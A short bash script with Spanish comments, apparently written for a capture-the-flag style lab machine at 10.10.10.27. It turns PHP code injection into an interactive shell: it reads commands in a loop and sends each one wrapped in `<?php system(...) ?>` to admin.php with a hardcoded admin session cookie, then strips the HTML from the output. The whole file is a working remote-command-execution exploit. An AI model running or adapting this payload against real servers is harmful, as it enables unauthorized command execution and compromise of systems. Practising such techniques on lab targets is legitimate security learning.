#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	exit 1
}

# Ctrl+C
trap ctrl_c INT

# Variables Globales
main_url="http://10.10.10.27/admin.php"

while true; do
	echo -n "[~] " && read -r command
	# realizamos la peticion por URL le pasamos el comando por metodo GET
	# Insertamos la cookie de session para mantener la session
	# comando -G envia la cookie por URL
	# grep "\/body" -A 500 -> este comando lista las siguientes 500 lineas que esten debajo de la etiqueta /body
	# grep -v "\/body" quita la etiqueta body de pantalla
	echo; curl -s -G GET $main_url --data-urlencode "html=<?php system(\"$command\"); ?>" --cookie "adminpowa=noonecares" | grep "\/body" -A 500 | grep -v "\/body"; echo
done
